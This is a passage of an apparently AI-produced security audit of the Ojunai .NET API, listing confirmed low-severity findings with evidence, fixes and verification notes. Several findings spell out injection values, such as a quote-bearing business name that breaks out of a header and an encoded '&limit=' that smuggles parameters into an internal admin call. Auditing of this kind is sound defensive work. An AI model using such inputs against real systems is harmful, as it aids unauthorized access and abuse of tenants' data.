- **CWE:** CWE-178: Improper Handling of Case Sensitivity / CWE-778: Insufficient Logging
- **OWASP:** A09:2021 Security Logging and Monitoring Failures
- **Component:** Ojunai.API/Controllers/AdminController.cs — GetOnboardingAnalytics
- **Files:** Ojunai.API/Controllers/AdminController.cs

**Description:** The prior audit hardened admin-key checking: the shared ValidateAdminKeyInner helper (AdminController.cs:125-145) now does a case-SENSITIVE FixedTimeEquals and every call goes through ValidateAdminKey, which writes an AdminAuditEntry (success or failure) so admin access is recorded. That fix was NOT applied to GetOnboardingAnalytics. Lines 26-28 still perform the OLD comparison: FixedTimeEquals over (key ?? "").ToLowerInvariant() vs secret.ToLowerInvariant(). The comment at lines 134-135 explicitly states lowercasing 'roughly halved the effective entropy of the admin key,' yet this endpoint keeps doing exactly that. It also never calls ValidateAdminKey, so unlike every other admin endpoint it writes NO audit row — brute-force attempts and successful accesses to this endpoint are invisible to the audit trail the team built. The endpoint returns onboarding PII (business names, owner names, cities, business types, recent signups; phone numbers are redacted) for all in-flight onboarding flows.

**Attack scenario:** An attacker guessing the admin key against /api/admin/onboarding-analytics benefits from the halved keyspace (case-insensitive match) and generates zero audit entries, whereas the same attack against /api/admin/audit-log or /api/admin/wipe-* is case-sensitive and fully logged. On success they read onboarding PII for every merchant currently signing up.

**Preconditions:** Requires knowledge/guessing of the 32+ char Admin:AnalyticsKey; realistic impact is the consistency/audit gap rather than practical brute force of a 32-char key.

**Impact:** Weakened (case-insensitive) key comparison and complete absence of audit logging on an admin endpoint that discloses onboarding PII; inconsistent with the hardened path used by all sibling endpoints.

**Evidence:** AdminController.cs:22 `GetOnboardingAnalytics([FromQuery] string key)`; lines 26-28 compare `Encoding.UTF8.GetBytes((key ?? "").ToLowerInvariant())` against `Encoding.UTF8.GetBytes(secret.ToLowerInvariant())` and there is no WriteAuditEntry/ValidateAdminKey call in this method. Contrast lines 136-138 (case-sensitive) and lines 117-122 (audit write) used by all other admin actions.

**Recommended fix:** Replace the inline check in GetOnboardingAnalytics with a call to the shared ValidateAdminKey(key) helper so it inherits the case-sensitive constant-time compare AND the audit-log write, matching every other admin endpoint.

**Verification:** Verified directly in /Users/kendennis/Desktop/Ojunai-AI/Ojunai.API/Controllers/AdminController.cs. GetOnboardingAnalytics (lines 22-28) performs an inline case-INSENSITIVE compare: FixedTimeEquals over Encoding.UTF8.GetBytes((key ?? "").ToLowerInvariant()) vs secret.ToLowerInvariant(). It does NOT call the shared ValidateAdminKey(key) helper, so WriteAuditEntry (lines 147-176) is never invoked — no AdminAuditEntry row is written on success or failure for this endpoint. This is confirmed by contrast with the hardened path: ValidateAdminKeyInner (lines 125-145) uses a case-SENSITIVE FixedTimeEquals (lines 136-138), and its comment (lines 134-135) explicitly notes the old lowercasing "roughly halved the effective entropy of the admin key." Every other admin endpoint (AuditLog, WipeInventoryExpenses, WipeAllData, RecategorizeProducts, all metrics/*, billing-*, telemetry/*, voice-ai/* — verified across the file) calls ValidateAdminKey(key) and thus gets both the case-sensitive compare and the audit write. So both defects the finder claims are genuinely present and this endpoint is the sole exception. The endpoint returns onboarding PII (business names, owner names, cities, business types, recent signups; phones redacted via RedactPhone). No unstated guard exists — the inline check is the only auth on this method. The one attack overstatement (practical brute-force benefit from halved keyspace) is acknowledged and de-rated by the finder itself; a 32+ char key remains infeasible to brute-force even case-insensitively, so the real impact is the consistency + audit-trail gap. Low severity is accurate.

---

## F23 · [Low] Admin API key transmitted in URL query string, exposing it to reverse-proxy/access logs and browser history
- **Domain:** infra-cicd-secrets-deps · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-598: Use of GET Request Method With Sensitive Query Strings
- **OWASP:** A09:2021 Security Logging and Monitoring Failures
- **Component:** Ojunai.API/Controllers/AdminController.cs — all admin endpoints
- **Files:** Ojunai.API/Controllers/AdminController.cs

**Description:** Every admin endpoint accepts the secret via `[FromQuery] string key` (onboarding-analytics:22, audit-log:183, wipe-inventory-expenses:233, wipe-all-data:280, recategorize-products:337, billing-overview:398, billing-events:427, metrics/overview:467, metrics/snapshots:557, etc.). The full request line — including `?key=<the admin secret>` — is written verbatim to the Nginx access log, stored in browser history, and sent in Referer headers on any outbound navigation. WriteAuditEntry deliberately strips `key` before persisting it to AdminAuditEntry (lines 158-163), which shows the team already treats the key as log-sensitive, but that stripping does not affect the reverse proxy's own access_log, which records the raw URL.

**Attack scenario:** Anyone with read access to Nginx access logs (or a log-aggregation pipeline, backup, or shared browser) recovers the live admin key from a logged request line and then invokes destructive endpoints such as POST /api/admin/wipe-all-data.

**Preconditions:** Attacker needs read access to server/proxy access logs, browser history, or an intermediary that records URLs.

**Impact:** Disclosure of the admin master key, which authorizes destructive data-wipe and PII-read admin endpoints.

**Evidence:** AdminController.cs:22, 183, 233, 280, 337, 398, 427, 467, 557 all bind `key` from the query string; WriteAuditEntry at lines 158-163 explicitly filters out the `key` parameter before saving, acknowledging its sensitivity.

**Recommended fix:** Accept the admin key via a request header (e.g. `[FromHeader(Name="X-Admin-Key")]`, as VoiceAI already does with X-VoiceAI-Key) or an Authorization bearer token instead of the query string, so it is never captured in proxy access logs, history, or Referer headers.

**Verification:** Opened Ojunai.API/Controllers/AdminController.cs (actual path is /Users/kendennis/Desktop/Ojunai-AI/Ojunai.API/Controllers/AdminController.cs, not under dashboard/). Verified all claims: (1) Every admin endpoint binds the secret via [FromQuery] string key, confirmed by grep — including destructive POST endpoints wipe-all-data (line 279-280) and wipe-inventory-expenses (line 232-233), which take the key in the query string rather than the request body, so the secret is placed in the request URL. (2) WriteAuditEntry at lines 158-163 explicitly filters out the 'key' parameter (case-insensitive) from the persisted query string and stores only a 12-char SHA-256 prefix of the key, proving the team already treats it as log-sensitive; but this stripping only affects the app's own AdminAuditEntry table, not the reverse proxy's access_log which records the raw request line. (3) The recommended header-based fix is precedented in the same codebase: BusinessController.cs uses [FromHeader(Name=\"X-VoiceAI-Key\")] at lines 387/446/538/575/622, so query-string transmission is an avoidable design choice. The vulnerability is real and exploitable-as-described: the admin master key (?key=<secret>) is written to Nginx access logs, browser history, and Referer headers, and that single key authorizes destructive data-wipe and PII-read endpoints. No unstated blocker exists. Severity Low is correct — this is a defense-in-depth secret-exposure issue requiring a realistic but secondary precondition (read access to proxy/aggregation logs, backups, or a shared browser); Medium is defensible given the destructive blast radius, but the secondary-access requirement keeps it at Low.

---

## F24 · [Low] Content-Disposition header built from unsanitized business name
- **Domain:** injection · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers
- **OWASP:** A03:2021 Injection
- **Component:** Ojunai.API / BusinessController (data export)
- **Files:** Ojunai.API/Controllers/BusinessController.cs, Ojunai.API/DTOs/Auth/RegisterOwnerRequest.cs

**Description:** The GDPR/account data-export endpoint constructs the Content-Disposition response header by string-interpolating the caller's business name directly: `var filename = $"ojunai-export-{business.Name.Replace(" ", "-").ToLowerInvariant()}-...json"; Response.Headers["Content-Disposition"] = $"attachment; filename=\"{filename}\"";`. Only spaces are replaced; quotes and other special characters pass through. BusinessName is user-controlled (RegisterOwnerRequest.BusinessName has only MinLength/MaxLength(200) with no character allow-list; it is also settable via chat onboarding and the AI-driven DetectAndApplyCorrection path, none of which strip control/quote characters). A double-quote in the name closes the quoted filename token and injects arbitrary Content-Disposition parameters; a CR/LF would make Kestrel reject the header at flush time and 500 the user's own export.

**Attack scenario:** Business owner sets their business name to `evil";x=y` (or contains a stray quote). On calling the export endpoint, the emitted header becomes `attachment; filename="...evil";x=y...json"`, breaking out of the quoted-string and injecting header parameters. A CR/LF in the name instead causes the export response to fail with 500.

**Preconditions:** Authenticated business owner; business name contains a quote or control character.

**Impact:** Self-scoped: the attacker controls only their own business name and downloads only their own file, so there is no cross-tenant effect. Realistic impact is a malformed/injected Content-Disposition parameter on the attacker's own response or a self-inflicted broken export (DoS of their own download). No response-splitting because Kestrel rejects CR/LF header values.

**Evidence:** BusinessController.cs:290-291 interpolate business.Name into filename and then into Response.Headers["Content-Disposition"] with no escaping of quotes/control chars; RegisterOwnerRequest.cs:11 shows BusinessName has no character validation (MaxLength only).

**Recommended fix:** Sanitize the filename before placing it in the header: strip or percent-encode everything outside a safe set (e.g. `[A-Za-z0-9._-]`), or use ContentDispositionHeaderValue with FileNameStar and let the framework encode it. Do not interpolate raw user text into response headers.

**Verification:** All cited code is confirmed exactly as described. BusinessController.cs:290-291 builds `filename` by interpolating `business.Name` with only `Replace(" ", "-")` applied (no quote/control-char handling), then interpolates it into a quoted `Content-Disposition` header value via `Response.Headers["Content-Disposition"] = $"attachment; filename=\"{filename}\""`. No framework encoding is applied when assigning to Response.Headers directly. RegisterOwnerRequest.cs:11 confirms BusinessName has only MinLength(2)/MaxLength(200) with no character allow-list. I verified the name is never sanitized on the way in: AuthService.cs:79 assigns `Name = request.BusinessName` raw (register path never calls CleanName), the onboarding CleanName (OnboardingService.cs:372) only trims/splits-on-space/capitalizes and does not strip quotes or control chars, and the AI correction path (OnboardingService.cs:339) assigns `value` raw. Therefore a double-quote in the business name breaks out of the quoted filename token and injects arbitrary Content-Disposition parameters, and a CR/LF causes Kestrel to reject the header at flush, 500-ing the export. The endpoint is gated by [RequirePermission(Permission.ManageSettings)] and scoped to BusinessId, so the attack is entirely self-scoped — the attacker controls only their own name and receives only their own response. The finder's severity self-assessment (Low, no cross-tenant impact, no CRLF response-splitting because Kestrel blocks it, only self-inflicted header-parameter injection or a self-DoS) is accurate. This is a real but low-severity improper-output-neutralization issue.

---

## F25 · [Low] voice-ai-reservations status query parameter injected into internal admin call without validation or encoding
- **Domain:** injection · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-88: Improper Neutralization of Argument Delimiters (Argument/Parameter Injection)
- **OWASP:** A03:2021 Injection
- **Component:** Ojunai.API / BusinessController (Voice AI reservations proxy)
- **Files:** Ojunai.API/Controllers/BusinessController.cs

**Description:** GetVoiceAIReservations builds the upstream URL as `var qs = $"?status={status ?? "all"}&limit={Math.Clamp(limit,1,200)}"; ... $"/api/admin/businesses/{business.VoiceAIBusinessId}/reservations{qs}"`. The `status` query parameter is taken straight from the caller and is neither URL-encoded nor validated against an allow-list, unlike the sibling PATCH endpoint (UpdateVoiceAIReservationStatus) which validates status against {cancelled,fulfilled,expired}. The resulting URL is sent to the internal Voice AI admin API carrying the privileged X-Admin-Key. Because status is unescaped, an attacker can append additional query parameters (e.g. `status=all&limit=100000`) into the internal admin request.

**Attack scenario:** Authenticated user with ViewStock permission calls GET voice-ai-reservations?status=x%26limit%3D999999 (or any `&`-bearing value). The injected `&limit=...` (and any other params) are forwarded verbatim into `/api/admin/businesses/{ownVoiceAIBusinessId}/reservations?status=x&limit=999999&limit=50`, overriding the server-side clamp and injecting arbitrary listing parameters into the admin API.

**Preconditions:** Authenticated user with ViewStock permission on a business that has Voice AI enabled and provisioned.

**Impact:** Blast radius is limited to the caller's own tenant: the path businessId is the caller's own VoiceAIBusinessId, so injected parameters can only affect listing of the attacker's own reservations (e.g. bypass the limit clamp, trigger a large upstream response). No host or path control, so not full SSRF and no cross-tenant access.

**Evidence:** BusinessController.cs:779 `var qs = $"?status={status ?? "all"}&limit={Math.Clamp(limit, 1, 200)}";` with no encoding/allow-list on status, versus BusinessController.cs:869-871 which validates status against an explicit allow-list for the PATCH sibling. `since` at line 780 IS Uri.EscapeDataString'd, confirming status was overlooked.

**Recommended fix:** Validate status against the same allow-list used by the PATCH endpoint (or map to a fixed set) and Uri.EscapeDataString it before appending, matching the treatment already applied to `since`.

**Verification:** Verified directly in Ojunai.API/Controllers/BusinessController.cs. Line 779 builds `var qs = $"?status={status ?? "all"}&limit={Math.Clamp(limit, 1, 200)}"` with `status` taken from the `[FromQuery] string? status` parameter and interpolated with no URL-encoding and no allow-list. The very next line (780) escapes `since` via Uri.EscapeDataString, and the PATCH sibling (lines 869-871) validates status against `{cancelled, fulfilled, expired}` — confirming both that encoding/validation is the established norm and that status here was overlooked. Because `status` is unescaped, a value such as `status=all%26limit%3D999999` decodes to `all&limit=999999`, producing the upstream URL `/api/admin/businesses/{ownId}/reservations?status=all&limit=999999&limit=50` sent with the privileged X-Admin-Key. This is a genuine argument/parameter injection (CWE-88): the attacker can inject arbitrary `&`-delimited query params into the internal admin request and plausibly override the server-side limit clamp (if upstream scalar binding takes the first duplicate key). No unstated blocker refutes it — the preconditions (authenticated ViewStock user on a Voice-AI-provisioned business) are realistic and the guard exists only on the sibling endpoint, not this one.

---

## F26 · [Low] Global exception handler returns raw internal exception messages to clients
- **Domain:** logging-privacy-crypto · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)
- **OWASP:** A05:2021 Security Misconfiguration
- **Component:** Ojunai.API/Program.cs
- **Files:** Ojunai.API/Program.cs

**Description:** The global exception handler serializes error.Error.Message straight into the client response body for UnauthorizedAccessException (401), and for InvalidOperationException/KeyNotFoundException/ArgumentException (400). Only the catch-all 500 branch returns a generic message. InvalidOperationException and ArgumentException are extremely broad in .NET and are thrown by framework/EF/LINQ code with implementation-detail messages (e.g. 'Sequence contains no elements', EF/Npgsql state, parameter names/values), so internal details can be reflected to unauthenticated or low-privilege callers.

**Attack scenario:** An attacker crafts input that triggers an unexpected InvalidOperationException/ArgumentException in a handler and reads the reflected .Message to learn internal structure (entity/property names, invariants, occasionally connection/state hints), aiding further attacks.

**Preconditions:** Any code path (framework or app) that throws UnauthorizedAccessException, InvalidOperationException, KeyNotFoundException, or ArgumentException reaches the global handler.

**Impact:** Information disclosure of internal implementation details via error messages; low direct impact but useful for reconnaissance.

**Evidence:** Program.cs:347-356 — UnauthorizedAccessException branch returns ApiResponse.Fail(error.Error.Message); the InvalidOperationException/KeyNotFoundException/ArgumentException branch returns ApiResponse.Fail(error.Error.Message). Only the else branch (line 365) returns the generic 'An unexpected error occurred.'

**Recommended fix:** Map these exception types to fixed, safe messages (or a small allowlist of intentionally user-facing domain messages) and log the real message server-side only, mirroring the 500 branch.

**Verification:** Verified against Program.cs:347-356 and Ojunai.API/Common/ApiResponse.cs:13. The 401 (UnauthorizedAccessException) and 400 (InvalidOperationException/KeyNotFoundException/ArgumentException) branches both pass error.Error.Message directly to ApiResponse.Fail, which serializes it into the response Errors list. Only the 500 catch-all returns a generic message and logs server-side. The handler is registered unconditionally in Program.cs (not gated on IsDevelopment), so it is the production error path, and it is the only exception middleware in the codebase — nothing intercepts or sanitizes first. Framework-thrown exceptions of these broad types genuinely reach it: the codebase has many unguarded LINQ .First() calls (WhatsAppService.cs:2094/2247/2369/3674, ReportService.cs:328, etc.) that throw InvalidOperationException('Sequence contains no elements'), plus model-binding/parse ArgumentExceptions carrying parameter names and EF/Npgsql messages carrying SQL state. These are reflected verbatim to potentially unauthenticated/low-privilege callers. This is a real CWE-209 information disclosure.

---

## F27 · [Low] Paystack annual charge.success is rejected against the monthly price, causing annual NGN renewals to lapse
- **Domain:** payments-webhooks · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-840: Business Logic Errors
- **OWASP:** A04:2021 Insecure Design
- **Component:** Payments — Paystack webhook charge.success
- **Files:** Ojunai.API/Services/PaystackService.cs, Ojunai.API/Common/BillingConfig.cs

**Description:** HandleChargeSuccess validates the charged amount against PlanLimits.Get(plan).PricePerMonth (PaystackService.cs:695-701), a fixed monthly figure. For an annual cycle the actual charge equals the annual price (~10x monthly per BillingConfig.cs:44-56), so Math.Abs(chargedNaira - expectedPrice) far exceeds the 1-unit tolerance and the handler logs 'payment.rejected' and returns WITHOUT extending SubscriptionEndsAt (PaystackService.cs:701-719). On the first annual purchase subscription.create still activates the plan (no amount check), masking the problem, but on annual renewal only charge.success is delivered — so the paid renewal is rejected and the subscription silently lapses at SubscriptionEndsAt. The amount check does not consult BillingConfig for the cycle-correct expected price the way the Flutterwave path does.

**Attack scenario:** No external attacker; this is a fail-closed billing-integrity defect. A paying annual NGN customer loses entitlement after a successful renewal charge because the webhook rejects the correct amount.

**Preconditions:** A business is billed on an annual NGN Paystack subscription (annual prices exist in BillingConfig, e.g. lite NGN 125000 vs monthly 12500). Affects the recurring renewal charge in year 2+ where only charge.success fires (no fresh subscription.create).

**Impact:** Legitimate annual NGN subscribers are downgraded despite paying; also emits misleading payment.rejected BillingEvents on every annual charge. No attacker gain (under-grants access), hence Low.

**Evidence:** PaystackService.cs:695 (expectedPrice = PlanLimits.Get(plan).PricePerMonth) compared at :701 against the full charged amount, with no annual multiplier; BillingConfig.cs:23,34,45,56 show annual NGN prices ~10x the monthly PlanLimits.PricePerMonth values (PlanLimits.cs:48,61,74,88).

**Recommended fix:** Compute the expected charge with BillingConfig.GetPrice(plan, cycle, currency) using the business's actual BillingCycle/BillingCurrency (as the Flutterwave path does) instead of PlanLimits.PricePerMonth, so annual charges validate against the annual price.

**Verification:** Verified directly in source. HandleChargeSuccess (PaystackService.cs:695) computes expectedPrice from PlanLimits.Get(plan).PricePerMonth — a fixed monthly value (PlanLimits.cs:48/61/74/88) with no cycle multiplier. The amount check at line 701, Math.Abs(chargedNaira - expectedPrice) > 1, is then applied to the actual Paystack charge. For an annual NGN subscription the recurring charge equals the annual price, which BillingConfig.cs:41 defines as monthly × 10 (e.g. lite NGN 125000 vs 12500). The difference (~112,500) blows past the 1-unit tolerance, so the handler logs 'payment.rejected' (lines 705-718) and returns without setting SubscriptionEndsAt. The first-purchase masking claim is also confirmed: HandleSubscriptionCreated (lines 543-544) sets SubscriptionEndsAt = now.AddYears(1) for annual with NO amount check, so the initial purchase activates fine. On year-2+ renewals Paystack delivers only charge.success (no fresh subscription.create), matched via the customer-code fallback (lines 591-601), carrying the full annual amount — which is rejected, so the paid subscription silently lapses. The correct cycle-aware helper (BillingConfig.GetPrice with the business's BillingCycle) is used elsewhere in the same file (line 58 for creation, line 106/1332 for refunds), confirming the charge.success path is the outlier the finding identifies. Secondary observation: line 772 also unconditionally extends only +1 month for full-price charges even for annual, but the rejection at line 718 is the primary lapse mechanism described. This is a genuine fail-closed billing-integrity defect. No unstated blocker; preconditions (an annual NGN subscriber reaching renewal) are realistic.

---

## F28 · [Low] MessengerAdapter processes only the first event per webhook delivery, dropping batched inbound messages
- **Domain:** webhooks-messaging-identity · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-754: Improper Check for Unusual or Exceptional Conditions
- **OWASP:** A04:2021 Insecure Design
- **Component:** Messenger webhook parsing
- **Files:** Ojunai.API/Services/Channels/Messenger/MessengerAdapter.cs, Ojunai.API/Controllers/WebhooksController.cs

**Description:** ParseInboundAsync loops over entry.Messaging but returns on the first event it can surface (MessengerAdapter.cs:133-188), and the controller enqueues exactly one ConversationMessage per delivery (WebhooksController.cs:209-240). Meta explicitly may deliver multiple messaging events in one call; every event after the first is silently discarded. The class comment acknowledges 'we surface only the first', treating it as good-enough. Combined with the fact that Meta will not re-deliver the dropped events (the 200 ack covers the whole batch), any second+ user message/postback in a batch is permanently lost.

**Attack scenario:** Not adversary-driven; a user who sends two quick messages, or whose message + referral arrive in one batch, has the later event dropped — e.g. a sale or a link-consume referral is lost with no error surfaced.

**Preconditions:** Meta batches more than one messaging event in a single webhook POST (documented behavior under load or when events queue).

**Impact:** Silent loss of legitimate inbound Messenger events (unrecorded actions, missed referral/link binds).

**Evidence:** MessengerAdapter.cs:133-188 (foreach entry/foreach ev, returns inside the loop on first match); WebhooksController.cs:209-240 (single ProcessInboundAsync enqueue per POST).

**Recommended fix:** Parse all events in the batch and enqueue one ConversationMessage per event (dedup already guards against double-processing), rather than returning after the first.

**Verification:** Both cited code paths behave exactly as the finding describes. In MessengerAdapter.cs (lines 133-188), ParseInboundAsync uses nested foreach loops over payload.Entry and entry.Messaging but returns a ConversationMessage the instant it matches the first message (line 150), postback (line 163), or referral (line 178) — so every subsequent event in the same webhook POST is never processed. The class-level comment (lines 19-20) and inline comment (lines 130-132) explicitly acknowledge "we surface only the first." In WebhooksController.cs ReceiveMessenger (lines 168-243), ParseInboundAsync is invoked once (line 209), yields a single message, and enqueues exactly one orchestrator job (lines 238-240) with no loop. The handler returns Ok()/200 for the entire delivery (line 242), so Meta's ack covers the whole batch and dropped events are not re-delivered. The dedup check (lines 219-235) keys only on the individual mid and would not block a multi-event fix. This means any second-or-later event batched into a single delivery (two quick user messages, or a message+referral pair) is permanently and silently lost. The described drop is real, verifiable, and has no unstated blocker. It is a reliability/correctness defect rather than an adversary-exploitable security flaw, matching the finder's own non-adversarial framing; Low severity is appropriate.

---

## F29 · [Low] ChannelLinkingService.ConsumeAsync enforces single-use via non-atomic read-check-write
- **Domain:** webhooks-messaging-identity · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition
- **OWASP:** A04:2021 Insecure Design
- **Component:** Channel link token consumption
- **Files:** Ojunai.API/Services/Channels/ChannelLinkingService.cs, Ojunai.API/Services/Channels/Telegram/PendingTelegramActionService.cs

**Description:** ConsumeAsync loads the token, checks ConsumedAtUtc is null, then sets it and SaveChangesAsync with no conditional/atomic update and no row-version (ChannelLinkingService.cs:55-105). Two concurrent webhook jobs (separate DbContexts) can both pass the null check and both bind an identity to the account. This is the same class of race that the prior audit explicitly fixed in PendingTelegramActionService by switching to an atomic conditional ExecuteUpdateAsync (PendingTelegramActionService.cs:77-89) — that hardening was not applied here, leaving single-use enforcement weaker for link tokens.

**Attack scenario:** If an attacker obtains a victim's link token and races the legitimate /start, both the attacker's chat_id and the victim's can be bound to the account before ConsumedAtUtc is committed, giving the attacker a persistent identity binding on the victim's tenant.

**Preconditions:** Two consume attempts for the same link token race within the same short window (e.g. the token holder taps twice, or an attacker who obtained the token races the legitimate bind).

**Impact:** Single-use link token can bind more than one identity under a race; limited because the token is a 32-byte secret, but the guarantee is weaker than the fixed pending-action path.

**Evidence:** ChannelLinkingService.cs:55-105 (read row, check ConsumedAtUtc, set, SaveChanges — no conditional update). Contrast the atomic fix at PendingTelegramActionService.cs:77-89.

**Recommended fix:** Consume with an atomic conditional update (UPDATE ... WHERE Id=@id AND ConsumedAtUtc IS NULL) and only bind when exactly one row is affected, mirroring PendingTelegramActionService.

**Verification:** Verified the code directly. ChannelLinkingService.ConsumeAsync (ChannelLinkingService.cs:55-105) is a genuine non-atomic read-check-write: tracked FirstOrDefaultAsync loads the token (55-58), checks ConsumedAtUtc is null (66-70), then binds a ContactIdentity, sets row.ConsumedAtUtc = now (102), and calls plain SaveChangesAsync (105). There is NO row-version/concurrency token on ChannelLinkToken (confirmed: model has none, and AppDbContext.cs:560-571 configures only a unique index on Token plus an expiry index — the unique-Token index prevents duplicate token values but does nothing to serialize concurrent consumption of the same row). Two concurrent DbContexts consuming the same token with different channelIdentity values can both pass the null check and both insert a ContactIdentity (distinct values pass the unique (Channel, ChannelIdentityValue) index at AppDbContext.cs:553), then both stamp the token row (last-write-wins), yielding two identity bindings on the tenant. The contrast the finder cites is accurate: PendingTelegramActionService.ConsumeAsync (lines 77-89) uses an atomic conditional ExecuteUpdateAsync(... WHERE ConsumedAtUtc == null) with a 0-rows-affected bail; that hardening is not applied to link tokens. The TOCTOU (CWE-367) is real and exploitable as described.

---

## Appendix — UNVERIFIED completeness-critic leads (chase round failed on session limits)

These were surfaced by the critic but their adversarial verification did not complete. **Do not treat as confirmed.** Each needs a follow-up verification pass:

- [chase:ResendNotificationsController] failed: You've hit your session limit · resets 3:30pm (America/Toronto)
- [chase:AccountRecoveryService token e] failed: You've hit your session limit · resets 3:30pm (America/Toronto)
- [chase:Negative quantity / negative p] failed: You've hit your session limit · resets 3:30pm (America/Toronto)
- [chase:Optimistic-concurrency retry l] failed: You've hit your session limit · resets 3:30pm (America/Toronto)
- [chase:WhatsAppService destructive-in] failed: You've hit your session limit · resets 3:30pm (America/Toronto)
- [chase:EventsController — anonymous u] Note: claude-opus-4-8[1m] (the safety classifier) was unavailable when reviewing this subagent's work. Please carefully verify the subagent's actions and output before acting on them.
- [chase:Inbound media download in chan] failed: You've hit your session limit · resets 3:30pm (America/Toronto)
- [chase:JWT validation parameters + gl] failed: You've hit your session limit · resets 3:30pm (America/Toronto)
- [chase:ProductService bundle/componen] failed: You've hit your session limit · resets 3:30pm (America/Toronto)
- [verify2:PurchaseOrder receive is not i] failed: You've hit your session limit · resets 3:30pm (America/Toronto)
- [verify2:No peer-rank enforcement in st] failed: You've hit your session limit · resets 3:30pm (America/Toronto)
- [verify2:Anonymous api/events write sin] failed: You've hit your session limit · resets 3:30pm (America/Toronto)
